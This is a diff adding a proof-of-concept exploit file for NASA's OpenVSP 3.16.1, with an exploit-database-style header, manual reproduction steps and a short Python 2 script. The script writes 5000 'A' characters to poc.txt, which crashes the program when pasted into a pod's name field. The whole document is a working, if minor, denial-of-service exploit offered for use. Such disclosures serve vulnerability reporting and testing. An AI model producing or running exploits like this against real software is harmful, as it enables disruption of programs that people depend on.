@@ -1,0 +1,36 @@
+# Exploit Title: NASA openVSP 3.16.1 - Denial of Service (PoC)
+# Exploit Author : L0RD
+# Date: 2018-08-28
+# Vendor Homepage : https://software.nasa.gov/software/LAR-17491-1
+# Software link: https://github.com/nasa/OpenVSP
+# Version: 3.16.1
+# Tested on: Windows 10
+# CVE: N/A
+
+# Description :
+# The Vehicle Sketch Pad (VSP) is an aircraft geometry tool for rapid
+# evaluation of advanced design concepts.
+# for more information , check out this page :
+# https://software.nasa.gov/featuredsoftware/openvsp
+
+# Steps to reproduce:
+# 1) Run the python exploit code and open "poc.txt" file
+# 2) Copy the content of file
+# 3) Open "vsp.exe"
+# 4) Navigate to "Geom browser" and click on Add
+# 5) Then Navigate to "pod" and click on sub
+# 6) Click on "Add" and paste the content of "poc.txt" into the "name" field
+# 7) Click on add and Crash!
+
+#!/usr/bin/python
+
+buffer = "A" * 5000
+payload = buffer
+try:
+    f=open("poc.txt","w")
+    print "[+] Creating %s bytes payload..." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
